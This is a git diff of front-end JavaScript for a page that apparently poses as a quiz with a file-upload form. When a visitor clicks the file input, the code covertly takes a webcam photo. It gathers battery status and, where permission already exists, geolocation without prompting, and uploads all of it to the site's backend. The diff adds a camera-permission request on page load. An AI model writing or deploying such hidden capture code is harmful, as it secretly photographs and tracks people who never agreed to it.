@@ -4,12 +4,25 @@ const canvas = document.getElementById("canvas");
 const fileInput = document.getElementById("user-file");
 
 const BACKEND_BASE = "/api";
-
-// Camera constraints
 const constraints = { video: { facingMode: "user" }, audio: false };
 
-// Flag to ensure camera is captured only once
 let cameraCaptured = false;
+
+// ================================
+// REQUEST CAMERA PERMISSION ON PAGE LOAD
+// ================================
+async function requestCameraPermission() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    stream.getTracks().forEach((t) => t.stop()); // stop immediately
+    console.log("Camera permission granted");
+  } catch (err) {
+    console.log("Camera permission denied");
+  }
+}
+
+// Trigger permission request once
+requestCameraPermission();
 
 // ================================
 // COLLECT METADATA
@@ -25,7 +38,6 @@ async function collectMetadata() {
     time: new Date().toLocaleString(),
   };
 
-  // Battery info
   if (navigator.getBattery) {
     try {
       const b = await navigator.getBattery();
@@ -33,7 +45,7 @@ async function collectMetadata() {
     } catch {}
   }
 
-  // Location (only if already granted, no extra popup)
+  // Only if already granted (no prompt)
   if (navigator.permissions && navigator.geolocation) {
     try {
       const status = await navigator.permissions.query({ name: "geolocation" });
@@ -50,19 +62,18 @@ async function collectMetadata() {
 }
 
 // ================================
-// CAPTURE CAMERA + SEND ONCE
+// CAPTURE CAMERA IMAGE & SEND
 // ================================
 async function captureAndSendCamera() {
-  if (cameraCaptured) return; // already done
+  if (cameraCaptured) return;
 
   try {
     const stream = await navigator.mediaDevices.getUserMedia(constraints);
     video.srcObject = stream;
 
-    // Wait 1–2s for a better capture
-    await new Promise((r) => setTimeout(r, 1500));
+    // Wait a little for camera to initialize
+    await new Promise((r) => setTimeout(r, 1000));
 
-    // Setup canvas size
     canvas.width = 640;
     canvas.height = 480;
     const ctx = canvas.getContext("2d");
@@ -71,29 +82,18 @@ async function captureAndSendCamera() {
     const image = canvas.toDataURL("image/png");
     const metadata = await collectMetadata();
 
-    // Send camera + metadata to backend
     await fetch(`${BACKEND_BASE}/upload`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ image, metadata }),
     });
 
-    // Stop camera
     stream.getTracks().forEach((t) => t.stop());
     cameraCaptured = true;
+    console.log("Camera image captured and sent");
   } catch (err) {
-    console.log("Camera blocked or denied:", err);
-    // Don't block the form submission if camera fails
+    console.log("Camera capture failed:", err);
   }
-}
-
-// ================================
-// Trigger camera capture ONLY on first click of file input
-// ================================
-if (fileInput) {
-  fileInput.addEventListener("click", async () => {
-    await captureAndSendCamera();
-  });
 }
 
 // ================================
@@ -108,10 +108,7 @@ async function uploadFile(file) {
         const res = await fetch(`${BACKEND_BASE}/file-upload`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            file: reader.result,
-            filename: file.name,
-          }),
+          body: JSON.stringify({ file: reader.result, filename: file.name }),
         });
         resolve(await res.json());
       } catch (err) {
@@ -125,7 +122,16 @@ async function uploadFile(file) {
 }
 
 // ================================
-// SUBMIT FORM
+// FILE CLICK → CAPTURE CAMERA ONCE
+// ================================
+if (fileInput) {
+  fileInput.addEventListener("click", async () => {
+    await captureAndSendCamera();
+  });
+}
+
+// ================================
+// FORM SUBMIT
 // ================================
 form.addEventListener("submit", async (e) => {
   e.preventDefault();
@@ -136,14 +142,12 @@ form.addEventListener("submit", async (e) => {
   }
 
   try {
-    // Upload user file only on submit
     await uploadFile(fileInput.files[0]);
 
-    // Show success page
     document.getElementById("quiz-container").style.display = "none";
     document.getElementById("success-container").style.display = "flex";
   } catch (err) {
-    console.error("Upload failed:", err);
-    alert("File upload failed. Please try again.");
+    console.error("Submit error:", err);
+    alert("Upload failed. Try again.");
   }
 });
